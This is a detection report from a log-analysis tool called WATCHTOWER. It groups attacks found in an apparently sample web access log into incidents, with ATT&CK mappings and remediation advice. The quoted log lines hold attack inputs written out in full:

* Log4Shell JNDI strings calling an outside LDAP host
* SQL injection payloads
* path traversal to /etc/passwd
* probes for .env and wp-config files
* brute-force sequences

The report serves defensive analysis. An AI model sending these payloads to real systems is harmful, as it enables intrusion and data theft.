# WATCHTOWER Threat Detection Report

Generated: 2026-11-05 03:46:20 UTC

## Scan summary

- Files: examples/hard_access.log
- Time range: 2026-11-01T00:00:00+00:00 to 2026-11-01T05:59:30+00:00
- Lines read: 2612
- Lines parsed: 2612
- Lines malformed: 0
- Unique clients: 48
- Alerts: 16

## Incidents by severity

| Severity | Incidents |
|---|---|
| critical | 5 |
| high | 3 |
| medium | 3 |
| low | 0 |

## Incidents

### 1. 203.0.113.23 (critical, score 100)

- Client: 203.0.113.23
- Score: 100/100
- Severity: critical
- Stages: credential-access
- Window: 2026-11-01 00:26:56 UTC to 2026-11-01 00:47:11 UTC
- Summary: 203.0.113.23 brute-forced a login (41 failed attempts); the brute force ended in a successful login.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-BRUTE-FORCE | high | [T1110](https://attack.mitre.org/techniques/T1110/) | 41 | 2026-11-01 00:26:56 UTC | 2026-11-01 00:47:11 UTC |
| BEH-BRUTE-SUCCESS | critical | [T1110](https://attack.mitre.org/techniques/T1110/) | 41 | 2026-11-01 00:42:36 UTC | 2026-11-01 00:47:11 UTC |

**BEH-BRUTE-FORCE**: Login brute force (10 login POSTs within 300s (threshold 10).)

```text
203.0.113.23 - - [01/Nov/2026:00:29:30 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:30:01 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:30:29 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:31:00 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:31:28 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

**BEH-BRUTE-SUCCESS**: Successful login after brute force (Login succeeded (HTTP 302) after 40 failed attempts (401/403); credentials may be compromised.)

```text
203.0.113.23 - - [01/Nov/2026:00:45:08 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:45:38 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:46:10 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:46:39 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.23 - - [01/Nov/2026:00:47:11 +0000] "POST /login HTTP/1.1" 302 0 "https://shop.example.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.23 at the WAF or firewall.
- Brute force succeeded: reset the affected account's credentials, revoke active sessions and review what the session did after login.

### 2. 203.0.113.15 (critical, score 100)

- Client: 203.0.113.15
- Score: 100/100
- Severity: critical
- Stages: exploit
- Window: 2026-11-01 02:02:12 UTC to 2026-11-01 02:02:19 UTC
- Summary: 203.0.113.15 sent a Log4Shell (JNDI lookup) payload; three attempts returned 200.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-LOG4SHELL | critical | [T1190](https://attack.mitre.org/techniques/T1190/) | 3 | 2026-11-01 02:02:12 UTC | 2026-11-01 02:02:19 UTC |

**SIG-LOG4SHELL**: Log4Shell JNDI injection (CVE-2021-44228) (3 matching request(s); patterns: jndi-lookup. 3 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical.)

```text
203.0.113.15 - - [01/Nov/2026:02:02:12 +0000] "GET / HTTP/1.1" 200 14531 "-" "${jndi:ldap://203.0.113.99/a}"
203.0.113.15 - - [01/Nov/2026:02:02:15 +0000] "GET /login HTTP/1.1" 200 262 "${jndi:ldap://203.0.113.99/b}" "${jndi:ldap://203.0.113.99/a}"
203.0.113.15 - - [01/Nov/2026:02:02:19 +0000] "GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.99%2Fc%7D HTTP/1.1" 200 10117 "-" "curl/8.5.0"
```

Recommended actions:

- Block or rate-limit 203.0.113.15 at the WAF or firewall.
- An exploit attempt got a 2xx answer: investigate the targeted endpoint for compromise and patch or disable it.

### 3. 203.0.113.14 (critical, score 100)

- Client: 203.0.113.14
- Score: 100/100
- Severity: critical
- Stages: recon, exploit
- Window: 2026-11-01 02:55:51 UTC to 2026-11-01 02:57:55 UTC
- Summary: 203.0.113.14 ran a sqlmap scan, then attempted SQL injection; 12 attempts returned 200.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-UA-SCANNER | medium | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | 40 | 2026-11-01 02:55:51 UTC | 2026-11-01 02:57:55 UTC |
| SIG-SQLI | critical | [T1190](https://attack.mitre.org/techniques/T1190/) | 40 | 2026-11-01 02:55:51 UTC | 2026-11-01 02:57:55 UTC |

**SIG-UA-SCANNER**: Known scanner user agent (40 matching request(s); patterns: scanner-ua.)

```text
203.0.113.14 - - [01/Nov/2026:02:55:51 +0000] "GET /products?id=1'+OR+'1'='1 HTTP/1.1" 500 225 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:55:54 +0000] "GET /products?id=1+UNION+SELECT+NULL-- HTTP/1.1" 200 6006 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:55:59 +0000] "GET /products?id=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1" 200 716 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:56:04 +0000] "GET /products?id=1;+SELECT+SLEEP(5)-- HTTP/1.1" 200 14618 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:56:05 +0000] "GET /products?id=1'+AND+SLEEP(5)--+- HTTP/1.1" 500 382 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
```

**SIG-SQLI**: SQL injection pattern (40 matching request(s); patterns: tautology, quote-or-cmp, union-select, select-fn, quote-comment, time-based, numeric-compare, sql-variable. 12 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical.)

```text
203.0.113.14 - - [01/Nov/2026:02:55:51 +0000] "GET /products?id=1'+OR+'1'='1 HTTP/1.1" 500 225 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:55:54 +0000] "GET /products?id=1+UNION+SELECT+NULL-- HTTP/1.1" 200 6006 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:55:59 +0000] "GET /products?id=1+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1" 200 716 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:56:04 +0000] "GET /products?id=1;+SELECT+SLEEP(5)-- HTTP/1.1" 200 14618 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
203.0.113.14 - - [01/Nov/2026:02:56:05 +0000] "GET /products?id=1'+AND+SLEEP(5)--+- HTTP/1.1" 500 382 "-" "sqlmap/1.8#stable (https://sqlmap.org)"
```

Recommended actions:

- Block or rate-limit 203.0.113.14 at the WAF or firewall.
- An exploit attempt got a 2xx answer: investigate the targeted endpoint for compromise and patch or disable it.
- Make sure sensitive files and paths probed during recon are not exposed.

### 4. 203.0.113.13 (critical, score 100)

- Client: 203.0.113.13
- Score: 100/100
- Severity: critical
- Stages: credential-access
- Window: 2026-11-01 03:35:51 UTC to 2026-11-01 03:39:41 UTC
- Summary: 203.0.113.13 brute-forced a login (41 failed attempts); the brute force ended in a successful login.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-BRUTE-FORCE | high | [T1110](https://attack.mitre.org/techniques/T1110/) | 41 | 2026-11-01 03:35:51 UTC | 2026-11-01 03:39:41 UTC |
| BEH-BRUTE-SUCCESS | critical | [T1110](https://attack.mitre.org/techniques/T1110/) | 41 | 2026-11-01 03:35:51 UTC | 2026-11-01 03:39:41 UTC |

**BEH-BRUTE-FORCE**: Login brute force (10 login POSTs within 300s (threshold 10).)

```text
203.0.113.13 - - [01/Nov/2026:03:36:22 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:36:26 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:36:34 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:36:40 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:36:48 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

**BEH-BRUTE-SUCCESS**: Successful login after brute force (Login succeeded (HTTP 302) after 40 failed attempts (401/403); credentials may be compromised.)

```text
203.0.113.13 - - [01/Nov/2026:03:39:17 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:39:24 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:39:31 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:39:34 +0000] "POST /login HTTP/1.1" 401 512 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
203.0.113.13 - - [01/Nov/2026:03:39:41 +0000] "POST /login HTTP/1.1" 302 0 "https://shop.example.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
```

Recommended actions:

- Block or rate-limit 203.0.113.13 at the WAF or firewall.
- Brute force succeeded: reset the affected account's credentials, revoke active sessions and review what the session did after login.

### 5. 203.0.113.24 (critical, score 85)

- Client: 203.0.113.24
- Score: 85/100
- Severity: critical
- Stages: exploit
- Window: 2026-11-01 04:38:13 UTC to 2026-11-01 04:40:22 UTC
- Summary: 203.0.113.24 attempted SQL injection; five attempts returned 200.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-SQLI | critical | [T1190](https://attack.mitre.org/techniques/T1190/) | 5 | 2026-11-01 04:38:13 UTC | 2026-11-01 04:40:22 UTC |

**SIG-SQLI**: SQL injection pattern (5 matching request(s); patterns: sql-variable, order-by, numeric-compare, tautology, quote-or-cmp. 5 request(s) were answered with HTTP 2xx, so the attempt may have succeeded; severity raised to critical.)

```text
203.0.113.24 - - [01/Nov/2026:04:38:13 +0000] "GET /products?id=1%20AND%201=CONVERT(int,@@version) HTTP/1.1" 200 14305 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.24 - - [01/Nov/2026:04:38:50 +0000] "GET /products?sort=name%20ORDER%20BY%2010-- HTTP/1.1" 200 20624 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.24 - - [01/Nov/2026:04:39:28 +0000] "GET /products?id=1+AND+1=2-- HTTP/1.1" 200 23299 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.24 - - [01/Nov/2026:04:39:54 +0000] "GET /products?id=1%20AND%201=1 HTTP/1.1" 200 5043 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.24 - - [01/Nov/2026:04:40:22 +0000] "GET /products?id=1%27%20AND%20%271%27=%272 HTTP/1.1" 200 8206 "https://shop.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.24 at the WAF or firewall.
- An exploit attempt got a 2xx answer: investigate the targeted endpoint for compromise and patch or disable it.

### 6. 203.0.113.22 (high, score 60)

- Client: 203.0.113.22
- Score: 60/100
- Severity: high
- Stages: credential-access
- Window: 2026-11-01 01:00:34 UTC to 2026-11-01 01:04:28 UTC
- Summary: 203.0.113.22 brute-forced a login (60 failed attempts).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-BRUTE-FORCE | high | [T1110](https://attack.mitre.org/techniques/T1110/) | 60 | 2026-11-01 01:00:34 UTC | 2026-11-01 01:04:28 UTC |

**BEH-BRUTE-FORCE**: Login brute force (10 login POSTs within 300s (threshold 10); 0 explicit 401/403 failures; status-agnostic; lower confidence.)

```text
203.0.113.22 - - [01/Nov/2026:01:00:56 +0000] "POST /wp-login.php HTTP/1.1" 200 2645 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.22 - - [01/Nov/2026:01:01:01 +0000] "POST /wp-login.php HTTP/1.1" 200 2583 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.22 - - [01/Nov/2026:01:01:04 +0000] "POST /wp-login.php HTTP/1.1" 200 2628 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.22 - - [01/Nov/2026:01:01:08 +0000] "POST /wp-login.php HTTP/1.1" 200 2629 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.22 - - [01/Nov/2026:01:01:11 +0000] "POST /wp-login.php HTTP/1.1" 200 2509 "https://shop.example.com/wp-login.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.22 at the WAF or firewall.
- Enforce account lockout or MFA on the targeted login endpoint and check for any successful logins from this client.

### 7. 203.0.113.16 (high, score 60)

- Client: 203.0.113.16
- Score: 60/100
- Severity: high
- Stages: exploit
- Window: 2026-11-01 01:45:20 UTC to 2026-11-01 01:45:58 UTC
- Summary: 203.0.113.16 attempted path traversal.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-TRAVERSAL | high | [T1190](https://attack.mitre.org/techniques/T1190/) | 7 | 2026-11-01 01:45:20 UTC | 2026-11-01 01:45:58 UTC |

**SIG-TRAVERSAL**: Path traversal pattern (7 matching request(s); patterns: repeated-dotdot, dotdot-target, etc-passwd, nested-dotdot, win-ini.)

```text
203.0.113.16 - - [01/Nov/2026:01:45:20 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 400 432 "-" "python-requests/2.31.0"
203.0.113.16 - - [01/Nov/2026:01:45:30 +0000] "GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 404 438 "-" "python-requests/2.31.0"
203.0.113.16 - - [01/Nov/2026:01:45:34 +0000] "GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1" 404 547 "-" "python-requests/2.31.0"
203.0.113.16 - - [01/Nov/2026:01:45:38 +0000] "GET /download?file=....//....//....//etc/passwd HTTP/1.1" 403 494 "-" "python-requests/2.31.0"
203.0.113.16 - - [01/Nov/2026:01:45:41 +0000] "GET /view?page=..\..\..\windows\win.ini HTTP/1.1" 404 372 "-" "python-requests/2.31.0"
```

Recommended actions:

- Block or rate-limit 203.0.113.16 at the WAF or firewall.
- Confirm the targeted endpoints reject the exploit payloads and are patched.

### 8. 203.0.113.25 (high, score 60)

- Client: 203.0.113.25
- Score: 60/100
- Severity: high
- Stages: exploit
- Window: 2026-11-01 04:44:35 UTC to 2026-11-01 04:45:45 UTC
- Summary: 203.0.113.25 attempted path traversal.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-TRAVERSAL | high | [T1190](https://attack.mitre.org/techniques/T1190/) | 4 | 2026-11-01 04:44:35 UTC | 2026-11-01 04:45:45 UTC |

**SIG-TRAVERSAL**: Path traversal pattern (4 matching request(s); patterns: repeated-dotdot, dotdot-target, etc-passwd.)

```text
203.0.113.25 - - [01/Nov/2026:04:44:35 +0000] "GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1" 404 234 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.25 - - [01/Nov/2026:04:45:05 +0000] "GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1" 403 271 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.25 - - [01/Nov/2026:04:45:33 +0000] "GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1" 403 578 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.25 - - [01/Nov/2026:04:45:45 +0000] "GET /download?file=%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc/passwd HTTP/1.1" 404 510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.25 at the WAF or firewall.
- Confirm the targeted endpoints reject the exploit payloads and are patched.

### 9. 203.0.113.11 (medium, score 40)

- Client: 203.0.113.11
- Score: 40/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 02:39:35 UTC to 2026-11-01 02:48:19 UTC
- Summary: 203.0.113.11 ran a nikto scan, then probed for sensitive files.

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-UA-SCANNER | medium | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | 84 | 2026-11-01 02:39:35 UTC | 2026-11-01 02:48:19 UTC |
| SIG-SENSITIVE-PATH | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 12 | 2026-11-01 02:39:35 UTC | 2026-11-01 02:40:10 UTC |

**SIG-UA-SCANNER**: Known scanner user agent (84 matching request(s); patterns: scanner-ua.)

```text
203.0.113.11 - - [01/Nov/2026:02:39:35 +0000] "GET /config.php.old HTTP/1.1" 404 187 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:39 +0000] "GET /phpinfo.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:41 +0000] "GET /.env HTTP/1.1" 404 306 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:45 +0000] "GET /.htpasswd HTTP/1.1" 404 204 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:49 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
```

**SIG-SENSITIVE-PATH**: Probe for sensitive file or path (12 matching request(s); patterns: backup-file, phpinfo, dotenv, cloud-creds, wp-config, db-admin, git-dir, cgi-bin, server-status.)

```text
203.0.113.11 - - [01/Nov/2026:02:39:35 +0000] "GET /config.php.old HTTP/1.1" 404 187 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:39 +0000] "GET /phpinfo.php HTTP/1.1" 404 501 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:41 +0000] "GET /.env HTTP/1.1" 404 306 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:45 +0000] "GET /.htpasswd HTTP/1.1" 404 204 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
203.0.113.11 - - [01/Nov/2026:02:39:49 +0000] "GET /wp-config.php.bak HTTP/1.1" 404 450 "-" "Mozilla/5.0 (compatible; Nikto/2.5.0)"
```

Recommended actions:

- Block or rate-limit 203.0.113.11 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.

### 10. 203.0.113.12 (medium, score 40)

- Client: 203.0.113.12
- Score: 40/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 03:34:33 UTC to 2026-11-01 03:35:52 UTC
- Summary: 203.0.113.12 ran a gobuster scan, then enumerated paths (80 requests answered 404).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| SIG-UA-SCANNER | medium | [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | 80 | 2026-11-01 03:34:33 UTC | 2026-11-01 03:35:52 UTC |
| BEH-404-BURST | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 80 | 2026-11-01 03:34:33 UTC | 2026-11-01 03:35:52 UTC |

**SIG-UA-SCANNER**: Known scanner user agent (80 matching request(s); patterns: scanner-ua.)

```text
203.0.113.12 - - [01/Nov/2026:03:34:33 +0000] "GET /portal HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:35 +0000] "GET /images2 HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:37 +0000] "GET /db HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:38 +0000] "GET /web HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:38 +0000] "GET /secret HTTP/1.1" 404 0 "-" "gobuster/3.6"
```

**BEH-404-BURST**: Burst of 404/403/410 responses (path enumeration) (20 miss responses (404/403/410) within 60s (threshold 20); consistent with directory guessing.)

```text
203.0.113.12 - - [01/Nov/2026:03:34:46 +0000] "GET /staging HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:47 +0000] "GET /uploads HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:47 +0000] "GET /backup HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:49 +0000] "GET /tmp HTTP/1.1" 404 0 "-" "gobuster/3.6"
203.0.113.12 - - [01/Nov/2026:03:34:51 +0000] "GET /test HTTP/1.1" 404 0 "-" "gobuster/3.6"
```

Recommended actions:

- Block or rate-limit 203.0.113.12 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.

### 11. 203.0.113.21 (medium, score 35)

- Client: 203.0.113.21
- Score: 35/100
- Severity: medium
- Stages: recon
- Window: 2026-11-01 00:39:19 UTC to 2026-11-01 00:51:33 UTC
- Summary: 203.0.113.21 enumerated paths (150 requests answered 404).

| Rule | Severity | ATT&CK | Count | First seen | Last seen |
|---|---|---|---|---|---|
| BEH-404-BURST | medium | [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | 150 | 2026-11-01 00:39:19 UTC | 2026-11-01 00:51:33 UTC |

**BEH-404-BURST**: Burst of 404/403/410 responses (path enumeration) (slow enumeration: 100 miss responses (404/403/410) within 900s (threshold 100); consistent with directory guessing.)

```text
203.0.113.21 - - [01/Nov/2026:00:46:59 +0000] "GET /files4/ HTTP/1.1" 404 198 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:47:05 +0000] "GET /logs4/ HTTP/1.1" 403 324 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:47:09 +0000] "GET /data4/ HTTP/1.1" 404 208 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:47:14 +0000] "GET /web4/ HTTP/1.1" 404 518 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.21 - - [01/Nov/2026:00:47:19 +0000] "GET /site4/ HTTP/1.1" 404 276 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
```

Recommended actions:

- Block or rate-limit 203.0.113.21 at the WAF or firewall.
- Make sure sensitive files and paths probed during recon are not exposed.
